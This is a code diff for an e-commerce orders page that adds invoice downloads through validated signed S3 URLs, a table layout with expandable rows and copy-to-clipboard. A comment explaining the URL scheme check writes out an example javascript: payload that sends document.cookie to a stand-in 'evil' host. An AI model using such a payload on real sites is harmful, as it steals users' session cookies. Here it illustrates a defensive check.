@@ -58,6 +58,7 @@ import { formatPaiseINR } from '../lib/money';
 
 const API_BASE = process.env.NEXT_PUBLIC_API_BASE || 'https://wecare.digital/api';
 const MY_ORDERS_URL = `${ API_BASE }/ecommerce/my-orders`;
+const MY_INVOICE_URL = `${ API_BASE }/ecommerce/my-invoice`;
 
 /**
  * How long after an empty FIRST page we ask once more. The arrival path that needs it is real:
@@ -141,10 +142,184 @@ const STATUS_NOTE: Record<string, string> = {
 /** The two states that read as firm rather than advisory. A weight step, never a hue. */
 const STATUS_FIRM = new Set( [ 'captured', 'refunded' ] );
 
+/**
+ * An ALIAS, never a second Set. The states that are financially settled are exactly the states
+ * an invoice can exist for, so this is the same fact twice and not a coincidence worth
+ * duplicating - two identical payment-vocabulary sets with nothing forcing them to agree is how
+ * a vocabulary starts drifting. If they ever legitimately diverge (a rank that is firm but not
+ * invoiceable), split them THEN and add a test naming the difference.
+ */
+const INVOICE_ELIGIBLE = STATUS_FIRM;
+
 function dateLabel ( createdAt: number | null ): string {
   if ( createdAt === null || !Number.isFinite( createdAt ) ) return '';
   return new Date( createdAt * 1000 )
     .toLocaleDateString( 'en-IN', { day: 'numeric', month: 'short', year: 'numeric' } );
+}
+
+/**
+ * The column shows a short date; the detail panel is where the time belongs. Same refusal as
+ * `dateLabel`: an unreadable `createdAt` renders nothing rather than "Invalid Date".
+ */
+function dateTimeLabel ( createdAt: number | null ): string {
+  if ( createdAt === null || !Number.isFinite( createdAt ) ) return '';
+  return new Date( createdAt * 1000 ).toLocaleString( 'en-IN', {
+    day: 'numeric', month: 'short', year: 'numeric', hour: 'numeric', minute: '2-digit',
+  } );
+}
+
+/**
+ * The key for the VIEW state - expansion and the copy hint. A pure module-scope function, which
+ * the styled-jsx rule permits (only JSX may not be hoisted out of the return tree).
+ *
+ * It is NEVER empty, which is the whole reason it is separate from the invoice map's key: a row
+ * with no `orderNumber` and no `referenceId` still has a date, an amount and a status worth
+ * reading, so it must still be expandable. Behaviourally identical to the old React key
+ * (`referenceId || orderNumber || index`) - only the final fallback differs, and both are unique
+ * among siblings, which is all a key must be.
+ */
+const rowKey = ( order: OrderRow, index: number ) =>
+  order.referenceId || order.orderNumber || `row-${ index }`;
+
+/** Per-row invoice state. Transient; the column carries it, the panel never echoes it. */
+type InvoiceState = 'idle' | 'busy' | 'none' | 'failed' | 'rate';
+
+/**
+ * `fetchInvoiceUrl`'s return type, and `kind` is NOT the same vocabulary as `InvoiceState`:
+ * 'ok' is an outcome with no resting state (the row returns to 'idle' once the download fires)
+ * and 'expired' never becomes a cell at all, because it unmounts the table. Keeping the two
+ * separate is what stops a later edit rendering a cell for an outcome that has no cell.
+ */
+type InvoiceOutcome =
+  | { kind: 'ok'; url: string }
+  | { kind: 'none' }        // available:false, 400, 403, 404, or a 200 that is not JSON - terminal
+  | { kind: 'rate' }        // 429
+  | { kind: 'failed' }      // !response.ok, a network rejection, or an unsigned url
+  | { kind: 'expired' };    // 401 - the caller runs expire(); it never reaches a cell
+
+/**
+ * Mirrors `receipt_links.is_permanent_public_url`'s own marker set
+ * (lambda_utils/receipt_links.py), so the two sides cannot drift when the signer changes.
+ */
+const SIGNED_MARKERS = [ 'X-Amz-Signature=', 'X-Amz-Credential=', 'Signature=', 'Expires=' ];
+
+/**
+ * A TYPE PREDICATE (`url is string`), not a boolean, and the signature is load-bearing: the
+ * caller assigns the guarded value straight into InvoiceOutcome's `ok` arm, which is
+ * `{ kind: 'ok'; url: string }`. A boolean-returning guard narrows nothing, so `body.url` would
+ * still be `unknown` at the return and `tsc --noEmit` under strict would fail TS2322.
+ *
+ * WHY THE SCHEME IS TESTED AND NOT JUST THE SIGNATURE. The value is assigned to `a.href` and
+ * then clicked, so it is an execution surface rather than just a link. A marker-only predicate
+ * accepts `javascript:void(fetch('https://evil/?c='+document.cookie))` with an `Expires=`
+ * comment stapled on, and clicking an anchor with a javascript: href runs it in this origin,
+ * where the customer's session lives. The server's `assert_not_permanent` is no help here:
+ * `is_permanent_public_url` returns False for anything not starting with 'http', so it passes a
+ * non-http string THROUGH as "not permanent". `http://` is excluded too - a signed URL over
+ * plaintext hands the grant to any observer, and S3 presigned URLs are https in this account.
+ */
+function isSignedHttpsUrl ( url: unknown ): url is string {
+  return typeof url === 'string'
+    && url.startsWith( 'https://' )
+    && SIGNED_MARKERS.some( marker => url.includes( marker ) );
+}
+
+/**
+ * This function's BODY IS the error table, which is why it is written out rather than delegating
+ * to a guard somewhere else: the terminal-status set is spelled exactly once, here.
+ *
+ * 400, 403 and 404 are terminal rather than retryable, and none of the three is clearable by
+ * clicking: a 400 is a defect in the body we just built and a retry re-sends it byte-identical,
+ * a 403 is a missing or mis-qualified grant, and a 404 means the route is not where we think it
+ * is. A 200 whose body is not JSON says the same thing. An affordance that invites a loop it can
+ * never win is worse than a flat statement.
+ *
+ * Nothing on this path logs. The URL is a bearer grant.
+ */
+async function fetchInvoiceUrl (
+  token: string, referenceId: string, createdAt: number,
+): Promise<InvoiceOutcome> {
+  let response: Response;
+  try
+  {
+    response = await fetch( MY_INVOICE_URL, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json', authorization: `Bearer ${ token }` },
+      body: JSON.stringify( { referenceId, createdAt, format: 'png' } ),
+    } );
+  }
+  catch
+  {
+    return { kind: 'failed' };          // network rejection - recoverable, offers Try again
+  }
+
+  if ( response.status === 401 ) return { kind: 'expired' };
+  if ( response.status === 429 ) return { kind: 'rate' };
+  if ( response.status === 400 || response.status === 403 || response.status === 404 )
+  {
+    return { kind: 'none' };
+  }
+  if ( !response.ok ) return { kind: 'failed' };   // 5xx and anything else - recoverable
+
+  let data: unknown;
+  try { data = await response.json(); }
+  catch { return { kind: 'none' }; }
+
+  const body = ( data ?? {} ) as { available?: unknown; url?: unknown };
+  if ( body.available !== true ) return { kind: 'none' };
+  if ( !isSignedHttpsUrl( body.url ) ) return { kind: 'failed' };
+  return { kind: 'ok', url: body.url };
+}
+
+/**
+ * Only ever called with an outcome of kind 'ok', i.e. a url that already passed
+ * `isSignedHttpsUrl` inside `fetchInvoiceUrl` - so the guard runs BEFORE createElement and the
+ * element never exists carrying an unvalidated href.
+ *
+ * THERE IS NO `download` ATTRIBUTE, and that is a decision. `receipt_links.signed_url` bakes
+ * `attachment; filename="..."` INTO the signature, so S3 already returns the header that makes
+ * the browser download rather than navigate, under the server's own sanitised name. The
+ * attribute would be a second, unverified source of truth for the same fact - and `download` is
+ * same-origin-only, so a cross-origin response (which a presigned S3 URL is) makes the browser
+ * ignore it and honour Content-Disposition anyway. The downloaded file's name is owned entirely
+ * by the Lambda, which is also where the sanitisation lives.
+ *
+ * A synthetic anchor rather than `location.assign`: deterministic, keeps the page mounted, and
+ * directly assertable by spying on HTMLAnchorElement.prototype.click. Rejected: rendering a real
+ * <a href> after a successful fetch - two taps for a one-tap action, and it would leave a live
+ * bearer grant sitting in the DOM.
+ */
+function triggerDownload ( url: string ) {
+  const anchor = document.createElement( 'a' );
+  anchor.href = url;
+  anchor.rel = 'noopener';
+  document.body.appendChild( anchor );
+  anchor.click();
+  anchor.remove();
+}
+
+/**
+ * The refused-clipboard recovery, and IT CANNOT THROW - it runs inside `copyId`'s catch arm, so
+ * an exception here would break the only recovery that path has. jsdom implements
+ * createRange/getSelection only partially and a real browser can return null from
+ * getSelection() in a detached context, so every step is optional-chained inside one try. The
+ * worst case is that the text is not selected, which still leaves the hint and the announcement.
+ */
+function selectText ( el: HTMLElement | null ) {
+  if ( !el ) return;
+  try
+  {
+    const range = document.createRange();
+    range.selectNodeContents( el );
+    const selection = window.getSelection?.();
+    if ( !selection ) return;
+    selection.removeAllRanges();
+    selection.addRange( range );
+  }
+  catch
+  {
+    /* Selection is unavailable. The hint and the live region still carry the recovery. */
+  }
 }
 
 async function fetchOrders ( token: string, cursor: string ): Promise<Outcome> {
@@ -188,8 +363,123 @@ export default function OrdersPage (): React.ReactElement {
   const [ showProfile, setShowProfile ] = useState( false );
   const [ profileMode, setProfileMode ] = useState<CheckoutProfileMode>( 'name' );
 
+  /** Which detail panels are open. Many at once, deliberately - see `toggleRow`. */
+  const [ openRows, setOpenRows ] = useState<Record<string, boolean>>( {} );
+  /** Keyed on `order.referenceId`, written by `downloadInvoice` and read in the row locals. */
+  const [ invoiceState, setInvoiceState ] = useState<Record<string, InvoiceState>>( {} );
+  const [ copiedKey, setCopiedKey ] = useState<string | null>( null );
+  const [ copyFailedKey, setCopyFailedKey ] = useState<string | null>( null );
+  const [ liveMessage, setLiveMessage ] = useState( '' );
+  const [ canCopy, setCanCopy ] = useState( false );
+
   const liveRef = useRef( true );
   useEffect( () => () => { liveRef.current = false; }, [] );
+
+  /**
+   * A clipboard write needs a secure context, and the button must not exist where it cannot
+   * work. Computed in an EFFECT and never during render, so the server-rendered signedOut shell
+   * and the first client paint agree.
+   */
+  useEffect( () => {
+    setCanCopy(
+      typeof navigator !== 'undefined' && !!navigator.clipboard && window.isSecureContext );
+  }, [] );
+
+  /**
+   * ONE timer for the whole table, not one per row. Consequence, stated rather than discovered:
+   * copying row B while row A still reads "Copied" clears A's hint immediately. That is wanted -
+   * two rows both claiming "Copied" when only the last one is on the clipboard would be a lie -
+   * but it is a choice, and it is why a ref-per-row map was rejected along with its bookkeeping.
+   */
+  const copyTimer = useRef<ReturnType<typeof setTimeout> | null>( null );
+
+  const restartTimer = ( fn: () => void, ms = 2000 ) => {
+    if ( copyTimer.current ) clearTimeout( copyTimer.current );
+    copyTimer.current = setTimeout( fn, ms );
+  };
+
+  // The expiry path unmounts the table while a timer may still be pending, and setState on an
+  // unmounted tree is the warning this cleanup exists to avoid.
+  useEffect( () => () => { if ( copyTimer.current ) clearTimeout( copyTimer.current ); }, [] );
+
+  /**
+   * The parameter is `rowId` and not `key`, and the name is the point: there are two keyers in
+   * the row callback - `rowId` (never empty, keys the view state) and `invoiceKey`
+   * (`order.referenceId`, may be `''`, keys the request state). `key` was the overloaded name
+   * that let one identifier stand for both, and the read then used the wrong one of the pair.
+   */
+  const toggleRow = ( rowId: string ) =>
+    setOpenRows( prev => ( { ...prev, [ rowId ]: !prev[ rowId ] } ) );
+
+  /**
+   * WHAT IS COPIED COMES FROM REACT STATE, NEVER FROM THE DOM. SupportWidget rewrites text nodes
+   * for translation, so reading the rendered node could copy a transformed string into a support
+   * ticket. The id span keeps `data-wc-no-translate` for the same reason; the two defences are
+   * independent.
+   *
+   * BOTH ARMS CLEAR THE OTHER KEY. Clearing neither is a compounding bug: one refused write
+   * would leave "Press your copy key" on that row permanently, and a later successful copy would
+   * read "Copied" for two seconds and then REVERT to the failure wording, because the hint's
+   * ternary falls through to `copyFailedKey` the moment `copiedKey` goes back to null.
+   */
+  const copyId = async ( rowId: string, value: string, index: number ) => {
+    try
+    {
+      await navigator.clipboard.writeText( value );
+      setCopiedKey( rowId );
+      setCopyFailedKey( null );
+      setLiveMessage( 'Order ID copied' );        // no identifier in the announcement
+      restartTimer( () => { setCopiedKey( null ); setLiveMessage( '' ); } );
+    }
+    catch
+    {
+      // A rejected write is normally a denied permission. Saying nothing would leave the
+      // customer pressing a dead button, so the id is SELECTED and they can copy it with the
+      // keyboard - a real recovery rather than an apology.
+      selectText( document.getElementById( `ord-id-${ index }` ) );
+      setCopyFailedKey( rowId );
+      setCopiedKey( null );
+      setLiveMessage( 'Order ID selected. Copy it with your keyboard.' );
+      // DELIBERATELY NO TIMER. This hint is an INSTRUCTION about a selection that is still on
+      // screen, so it must last as long as that selection does. It is cleared by the next
+      // successful copy on any row, which is the only event that makes it untrue.
+    }
+  };
+
+  /**
+   * One switch over the outcome, and the `default` arm is the exhaustiveness MECHANISM rather
+   * than decoration. TypeScript checks a switch for exhaustiveness only when something forces
+   * it; this function returns Promise<void> and nothing consumes the switch, so without
+   * `const unhandled: never = outcome` a sixth outcome compiles clean and leaves the row stuck
+   * on 'busy' forever. `void unhandled` is there so the binding is not an unused local.
+   */
+  const downloadInvoice = async ( order: OrderRow ) => {
+    // The map's key. SAME NAME and same expression as the row callback's local, deliberately:
+    // this writes the map and the render reads it, so one grep finds both sides.
+    const invoiceKey = order.referenceId;
+    if ( !token || !invoiceKey || !Number.isInteger( order.createdAt ) ) return;
+    setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'busy' } ) );
+    const outcome = await fetchInvoiceUrl( token, invoiceKey, order.createdAt as number );
+    if ( !liveRef.current ) return;
+    switch ( outcome.kind )
+    {
+      case 'expired': expire(); return;           // unmounts the table; no row state to set
+      case 'ok':
+        triggerDownload( outcome.url );
+        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'idle' } ) );
+        return;
+      case 'none':
+        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'none' } ) );
+        return;
+      case 'rate':
+        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'rate' } ) );
+        return;
+      case 'failed':
+        setInvoiceState( prev => ( { ...prev, [ invoiceKey ]: 'failed' } ) );
+        return;
+      default: { const unhandled: never = outcome; void unhandled; return; }
+    }
+  };
 
   /**
    * The 4-second window is DERIVED, not stored. A boolean set from inside an effect is the
@@ -477,58 +767,306 @@ export default function OrdersPage (): React.ReactElement {
           { orders.length > 0 && (
             <section className="ord-list" aria-labelledby="ord-history">
               <h2 className="ord-h2" id="ord-history">Order history</h2>
-              <ul className="ord-items">
-                { orders.map( ( order, index ) => {
-                  const date = dateLabel( order.createdAt );
-                  const amount = order.currencyUnexpected
-                    ? ''
-                    : formatPaiseINR( order.amountPaise, order.currency );
-                  const label = STATUS_LABEL[ order.status ] || 'Status unavailable';
-                  const note = order.status
-                    ? ( STATUS_NOTE[ order.status ] || '' )
-                    : 'Contact us and we will check.';
-                  return (
-                    <li className="ord-item" key={ order.referenceId || order.orderNumber || index }>
-                      { /* An h3: the band owns the only h1 and the identity card owns an h2. A
-                           heading rather than a styled <p> so a screen reader can move order to
-                           order. data-wc-no-translate because it is an identifier. */ }
-                      <h3 className="ord-itemh" data-wc-no-translate>
-                        { order.orderNumber || order.referenceId || date }
-                      </h3>
-                      <dl className="ord-facts">
-                        { date && (
-                          <>
-                            <dt>Date</dt>
+
+              { /* ONE REAL TABLE AT EVERY WIDTH, with no display:block re-flow - that strips
+                   table semantics in several screen readers, which would trade the owner's
+                   "proper table" for something worse than the definition list it replaced.
+                   The 280px objection is answered by this scroll container plus the shell's
+                   minmax(0,1fr), which together keep documentElement.scrollWidth - vw at 0.
+
+                   tabIndex={0} is what lets a keyboard user scroll the region (WCAG 2.1.1). It
+                   adds one tab stop, which is the accepted cost. It is also the deliberate
+                   exception to the hairline split: a 1px border with no hover treatment at all,
+                   whose focus cue is the 3px outline. */ }
+              <div
+                className="ord-tablewrap"
+                role="region"
+                aria-labelledby="ord-history"
+                tabIndex={ 0 }
+              >
+                <table className="ord-table">
+                  <thead>
+                    <tr>
+                      { /* Exactly five. Not uppercase and not letter-spaced - this is the
+                           page's own 12px/700/#1a3a2a label rung, which is literally the old
+                           definition-list <dt> re-laid-out. */ }
+                      <th scope="col" className="ord-th">Order #</th>
+                      <th scope="col" className="ord-th ord-col-date">Date</th>
+                      <th scope="col" className="ord-th ord-th-num">Amount</th>
+                      <th scope="col" className="ord-th">Status</th>
+                      <th scope="col" className="ord-th">Invoice</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    { orders.map( ( order, index ) => {
+                      // TWO KEYERS FOR TWO MAPS, named separately. `rowId` is view state and is
+                      // never empty; `invoiceKey` is request state and is '' when there is
+                      // nothing to ask for. One local serving both is the shape that let a read
+                      // use the wrong one of the pair and stay correct only by coincidence of
+                      // render ordering. No identifier on this page is named `key`.
+                      const rowId = rowKey( order, index );
+                      const invoiceKey = order.referenceId;
+                      const date = dateLabel( order.createdAt );
+                      // The ONE ladder for the visible text, the row header's accessible name
+                      // and the copy button's label, so those three cannot disagree.
+                      const displayId =
+                        order.orderNumber || order.referenceId || date || '';
+                      // Deliberately NOT the same ladder: it stops at the two real identifiers
+                      // and never falls through to the date, because copying a date into a
+                      // support ticket is worse than no control at all.
+                      const copyValue = order.orderNumber || order.referenceId || '';
+                      const isOpen = !!openRows[ rowId ];
+                      // Derived from the render position, not the referenceId, so a row with no
+                      // identifier still gets a unique valid id and aria-controls is never empty.
+                      const detailId = `ord-detail-${ index }`;
+                      // '' short-circuits rather than falling back to rowId: a row with no
+                      // reference has no request this could ever key.
+                      const state = ( invoiceKey && invoiceState[ invoiceKey ] ) || 'idle';
+                      const amount = order.currencyUnexpected
+                        ? ''
+                        : formatPaiseINR( order.amountPaise, order.currency );
+                      const label = STATUS_LABEL[ order.status ] || 'Status unavailable';
+                      const note = order.status
+                        ? ( STATUS_NOTE[ order.status ] || '' )
+                        : 'Contact us and we will check.';
+
+                      // FIRST MATCH WINS, and the gate plus the three structural refusals are
+                      // all evaluated BEFORE any state is consulted. Computed as a word so the
+                      // ladder stays readable and the JSX stays one short chain over one value.
+                      const invoiceCell:
+                        'absent' | 'ineligible' | InvoiceState =
+                          !featureFlags.invoiceDownload ? 'absent'
+                            : !INVOICE_ELIGIBLE.has( order.status ) ? 'ineligible'
+                              : !invoiceKey ? 'ineligible'
+                                : !Number.isInteger( order.createdAt )
+                                  || ( order.createdAt as number ) <= 0 ? 'ineligible'
+                                  : state;
+
+                      // The panel's Invoice rung, same first-match-wins shape, and row 1 carries
+                      // THE SAME FLAG TERM as the cell's first row so the two cannot drift. The
+                      // third arm omits the rung entirely rather than echoing the transient
+                      // state: the column carries that, and the panel must not grow a second
+                      // place where it can disagree with the column.
+                      const panelInvoice =
+                        ( !featureFlags.invoiceDownload || state === 'none' )
+                          ? 'No invoice for this order. Some paid orders never get one — '
+                            + 'contact us and we will check.'
+                          : !INVOICE_ELIGIBLE.has( order.status )
+                            ? 'An invoice is created once the payment is settled.'
+                            : '';
+
+                      return (
+                        <React.Fragment key={ rowId }>
+                          <tr className={ isOpen ? 'ord-tr ord-tr-open' : 'ord-tr' }>
+                            { /* aria-label is the IDENTIFIER ONLY. A <th scope="row"> is
+                                 re-announced before each data cell in a screen reader's table
+                                 mode, and its default name is its text content - which here is
+                                 the trigger, the copy button, the hint, the Ref line and the
+                                 folded date, announced five times per row. The label RENAMES the
+                                 cell; it does not hide what is in it, so everything inside stays
+                                 in the DOM, focusable and separately named. */ }
+                            <th scope="row" className="ord-td" aria-label={ displayId }>
+                              <button
+                                type="button"
+                                className="ord-ordbtn"
+                                aria-expanded={ isOpen }
+                                aria-controls={ detailId }
+                                onClick={ () => toggleRow( rowId ) }
+                              >
+                                <span
+                                  className="ord-ordno"
+                                  id={ `ord-id-${ index }` }
+                                  data-wc-no-translate
+                                >
+                                  { displayId }
+                                </span>
+                                <span className="ord-caret" aria-hidden="true">
+                                  { isOpen ? '\u25be' : '\u25b8' }
+                                </span>
+                              </button>
+                              { /* THE CONTROL AND ITS HINT ARE GATED TOGETHER, inside ONE
+                                   fragment. A fragment emits no element, so .ord-tip stays the
+                                   IMMEDIATE FOLLOWING SIBLING of .ord-copy, which the `~` reveal
+                                   selectors require - wrapping the pair in a span, or nesting
+                                   the hint inside the button, would silently kill the hover and
+                                   focus reveals while leaving .ord-tip-on working, so the bug
+                                   would show up only on pointer and keyboard.
+
+                                   Gated together and not just the button, because
+                                   visibility:hidden KEEPS the box: an unconditional hint would
+                                   leave a permanently invisible 14px line on every row that can
+                                   never reveal it - a row with neither identifier, and every row
+                                   in a non-secure context. Reserving space for an unreachable
+                                   element is not a layout guarantee, it is a blank line. */ }
+                              { canCopy && copyValue && (
+                                <>
+                                  <button
+                                    type="button"
+                                    className="ord-copy"
+                                    aria-label={ `Copy order ID ${ copyValue }` }
+                                    onClick={ () => copyId( rowId, copyValue, index ) }
+                                  >
+                                    Copy
+                                  </button>
+                                  <span
+                                    className={ copiedKey === rowId || copyFailedKey === rowId
+                                      ? 'ord-tip ord-tip-on'
+                                      : 'ord-tip' }
+                                    aria-hidden="true"
+                                  >
+                                    { copiedKey === rowId
+                                      ? 'Copied'
+                                      : copyFailedKey === rowId
+                                        ? 'Press your copy key'
+                                        : 'Copy order ID' }
+                                  </span>
+                                </>
+                              ) }
+                              { /* On the row rather than in the panel: WhatsApp sends this as
+                                   `Ref:`, and an operator reading a support ticket should see it
+                                   without expanding anything. */ }
+                              <span className="ord-ref" data-wc-no-translate>
+                                Ref { order.referenceId }
+                              </span>
+                              { /* The Date column's understudy. ALWAYS in the DOM and revealed
+                                   by one media query - no JS width branch, no matchMedia, no
+                                   resize listener - so the rendered tree is identical at every
+                                   width, which is also what makes the fold assertable in jsdom
+                                   where there is no viewport. */ }
+                              <span className="ord-subdate">{ date }</span>
+                            </th>
                             { /* Deliberately TRANSLATABLE: a localised month name is an
-                                 improvement and no decision depends on its spelling. */ }
-                            <dd className="ord-date">{ date }</dd>
-                          </>
-                        ) }
-                        <dt>Amount</dt>
-                        <dd>
-                          { amount
-                            // Flagged because SupportWidget rewrites text-node values, and a
-                            // regrouped or renumbered amount would make this page lie about
-                            // money. "Amount unavailable" stays unflagged prose, so it translates.
-                            ? <span className="ord-amount" data-wc-no-translate>{ amount }</span>
-                            : 'Amount unavailable' }
-                        </dd>
-                        <dt>Payment</dt>
-                        <dd>
-                          <span
-                            className={ STATUS_FIRM.has( order.status )
-                              ? 'ord-status ord-status-firm'
-                              : 'ord-status' }
-                          >
-                            <span className="ord-status-label">{ label }</span>
-                            { note && <span className="ord-status-note">{ note }</span> }
-                          </span>
-                        </dd>
-                      </dl>
-                    </li>
-                  );
-                } ) }
-              </ul>
+                                 improvement and no decision depends on its spelling. Empty on an
+                                 unreadable createdAt, never "Invalid Date". */ }
+                            <td className="ord-td ord-col-date">{ date }</td>
+                            <td className="ord-td ord-td-num">
+                              { amount
+                                // Flagged because SupportWidget rewrites text-node values, and a
+                                // regrouped or renumbered amount would make this page lie about
+                                // money. "Amount unavailable" stays unflagged prose, so it
+                                // translates.
+                                ? <span className="ord-amount" data-wc-no-translate>{ amount }</span>
+                                : 'Amount unavailable' }
+                            </td>
+                            <td className="ord-td">
+                              <span
+                                className={ STATUS_FIRM.has( order.status )
+                                  ? 'ord-status ord-status-firm'
+                                  : 'ord-status' }
+                              >
+                                <span className="ord-status-label">{ label }</span>
+                                { note && <span className="ord-status-note">{ note }</span> }
+                              </span>
+                            </td>
+                            <td className="ord-td">
+                              { invoiceCell === 'absent' || invoiceCell === 'none'
+                                // Terminal, and the row does not re-ask: for some paid orders
+                                // "no invoice" is permanent rather than transient. Visible,
+                                // translatable words rather than a dash plus hidden text -
+                                // this page has no visually-hidden utility available, because
+                                // both height:1px and overflow:hidden are forbidden here.
+                                ? 'No invoice yet'
+                                : (
+                                  <>
+                                    <button
+                                      type="button"
+                                      className="ord-inv"
+                                      disabled={ invoiceCell === 'ineligible'
+                                        || invoiceCell === 'busy' }
+                                      aria-busy={ invoiceCell === 'busy' ? true : undefined }
+                                      onClick={ () => downloadInvoice( order ) }
+                                    >
+                                      { invoiceCell === 'busy'
+                                        ? 'Preparing…'
+                                        : invoiceCell === 'failed'
+                                          ? 'Try again'
+                                          : 'Download invoice' }
+                                    </button>
+                                    { invoiceCell === 'failed' && (
+                                      <span className="ord-invnote">
+                                        Could not fetch the invoice
+                                      </span>
+                                    ) }
+                                    { /* THE LABEL STAYS "Download invoice" HERE. A failed row
+                                         attempted and did not get an invoice, so "Try again"
+                                         names what it is being asked to do. A rate-limited row
+                                         was not refused the invoice at all - it was refused the
+                                         CADENCE - so the action is unchanged and the message,
+                                         not the label, carries the new information.
+                                         Relabelling it would invite the immediate second click
+                                         the limiter just declined. */ }
+                                    { invoiceCell === 'rate' && (
+                                      <span className="ord-invnote">
+                                        Too many requests. Wait a moment.
+                                      </span>
+                                    ) }
+                                  </>
+                                ) }
+                            </td>
+                          </tr>
+                          { isOpen && (
+                            // A <td>, never a <th>, so the five-column header equality is
+                            // unaffected. colSpan={5} because a detail spanning fewer would
+                            // misalign the hairlines.
+                            <tr className="ord-detailrow ord-tr-open">
+                              <td className="ord-detailcell" colSpan={ 5 }>
+                                <div id={ detailId }>
+                                  { /* The retained definition-list treatment, which is why the
+                                       .ord-facts rules survive the card list being deleted. */ }
+                                  <dl className="ord-facts">
+                                    <dt>Order number</dt>
+                                    <dd>
+                                      { order.orderNumber
+                                        ? <span data-wc-no-translate>{ order.orderNumber }</span>
+                                        : 'Not assigned' }
+                                    </dd>
+                                    <dt>Reference</dt>
+                                    <dd>
+                                      { order.referenceId
+                                        ? <span data-wc-no-translate>{ order.referenceId }</span>
+                                        : 'Not available' }
+                                    </dd>
+                                    <dt>Placed</dt>
+                                    <dd>{ dateTimeLabel( order.createdAt ) }</dd>
+                                    <dt>Amount</dt>
+                                    { /* THE SAME RENDERED STRING as the Amount cell, not
+                                         recomputed - one formatter, one value. */ }
+                                    <dd>
+                                      { amount
+                                        ? <span data-wc-no-translate>{ amount }</span>
+                                        : 'Amount unavailable' }
+                                    </dd>
+                                    <dt>Status</dt>
+                                    <dd>{ note ? `${ label } — ${ note }` : label }</dd>
+                                    <dt>Items</dt>
+                                    { /* Stated once per opened panel rather than omitted: the
+                                         owner asked for items, `items` cannot reach this wire
+                                         without deleting and recreating a production GSI, and a
+                                         silent absence reads as a bug. This is the slot the data
+                                         lands in if that projection ever changes. */ }
+                                    <dd>Item details are not available for this order.</dd>
+                                    { !!panelInvoice && (
+                                      <>
+                                        <dt>Invoice</dt>
+                                        <dd>{ panelInvoice }</dd>
+                                      </>
+                                    ) }
+                                  </dl>
+                                </div>
+                              </td>
+                            </tr>
+                          ) }
+                        </React.Fragment>
+                      );
+                    } ) }
+                  </tbody>
+                </table>
+              </div>
+
+              { /* ONE page-level polite region, not one per row. It is VISIBLE prose, because
+                   §6.4's source gates leave no visually-hidden utility available on this page;
+                   it is empty at rest, carries no identifier, and translates. */ }
+              <span className="ord-live" role="status" aria-live="polite">{ liveMessage }</span>
 
               { moreFailed && (
                 <p className="ord-notice" role="status">
@@ -605,26 +1143,9 @@ export default function OrdersPage (): React.ReactElement {
           .ord-page{color-scheme:light;display:flex;flex-direction:column;gap:32px;max-width:1100px}
 
           /* Mobile-first: one column, panel above orders, which is both the DOM order and the
-             layout this page already had. */
+             layout this page already had. The 1024px override lives with every other media
+             query at the foot of this stylesheet, after the defaults it overrides. */
           .ord-shell{display:grid;grid-template-columns:1fr;gap:28px}
-          @media(min-width:1024px){
-            /* minmax(0,1fr) IS NOT OPTIONAL and is the single most important line here. A bare
-               bare 1fr is minmax(auto,1fr), so the column refuses to shrink below its content's
-               intrinsic width, a wide table blows the grid out, and the overflow lands on the
-               DOCUMENT - which is what tools/browser/devicecheck.js measures
-               (document.documentElement.scrollWidth - vw) and fails on at 280px. With
-               minmax(0,...) the column shrinks and the table's own scroll container takes it.
-
-               1024px rather than the site's 767px body rung: a 340px panel beside a table needs
-               about 1024px before the table has usable room. */
-            .ord-shell{grid-template-columns:340px minmax(0,1fr);gap:32px;align-items:start}
-            /* Collapsed while the editor is open. CheckoutProfile's own grid is 1fr 1fr 1.5fr
-               and AddressFields' is 1fr 1fr, and both collapse only at a max-width:767px
-               VIEWPORT query - not a container query - so inside a 340px panel on a 1280px
-               desktop they would stay three- and two-up and render crushed inputs. Fixing that
-               properly means container queries on two shared components another phase owns. */
-            .ord-shell-editing{grid-template-columns:1fr}
-          }
           /* min-inline-size:0 for the same reason as minmax(0,...): a flex/grid item defaults to
              min-content and refuses to shrink. No position:sticky - the panel is short, and
              sticky interacts badly with overflow ancestors. */
@@ -660,15 +1181,95 @@ export default function OrdersPage (): React.ReactElement {
             font-size:16px;font-weight:700;line-height:1.5;
           }
 
-          .ord-items{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:14px}
-          .ord-item{padding:18px;border:1px solid #e5e7eb;border-radius:14px;background:#fff}
-          .ord-itemh{
+          /* A TABLE IS CORRECT HERE, and the 280px objection the previous comment raised is
+             answered by the container rather than by avoiding a table: .ord-tablewrap's
+             overflow-x:auto plus the shell's minmax(0,1fr) keep
+             document.documentElement.scrollWidth - vw at 0, which is what
+             tools/browser/devicecheck.js measures. The definition list, which does still
+             collapse to one column for free, is now the DETAIL PANEL's layout - which is why
+             these three rules survive the card markup being deleted. */
+          .ord-table{
+            width:100%;border-collapse:collapse;
             font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
-            margin:0 0 12px;font-size:18px;font-weight:700;line-height:1.3;
-            letter-spacing:-.25px;color:#1a1a1a;overflow-wrap:anywhere;
           }
-          /* Not a table: devicecheck.js measures 280px, where four columns are a horizontal
-             scroll. A definition list collapses to one column for free. */
+          .ord-tablewrap{overflow-x:auto;border:1px solid #e5e7eb;border-radius:14px;background:#fff}
+          .ord-tablewrap:focus-visible{outline:3px solid #1a3a2a;outline-offset:3px}
+
+          /* 1px and static: these borders never change. The row's hover is a background tint
+             only, and the 2px weight stays reserved for hoverable controls. */
+          .ord-th{
+            text-align:start;padding:14px 16px;border-block-end:1px solid #e5e7eb;
+            font-size:12px;font-weight:700;letter-spacing:0;color:#1a3a2a;white-space:nowrap;
+          }
+          .ord-th-num{text-align:end}
+          .ord-tr{border-block-start:1px solid #e5e7eb}
+          /* A reading aid, not an affordance: the <tr> has no onClick, no role, no tabindex and
+             no cursor:pointer, so there is nothing to discover and fail to activate. Row
+             tracking across five columns is what the tint is for. No :active equivalent - a tap
+             on a row must do nothing and look like it did nothing. */
+          .ord-tr:hover{background:rgba(209,244,112,.22)}
+
+          /* text-align:start and font-weight:400 are RESETS, and required rather than tidy:
+             .ord-td is also carried by the <th scope="row"> in column 1, where the UA stylesheet
+             gives font-weight:bold;text-align:center. .ord-th's start alignment does not reach
+             it (that class is on the column headers only), so without these two the widest cell
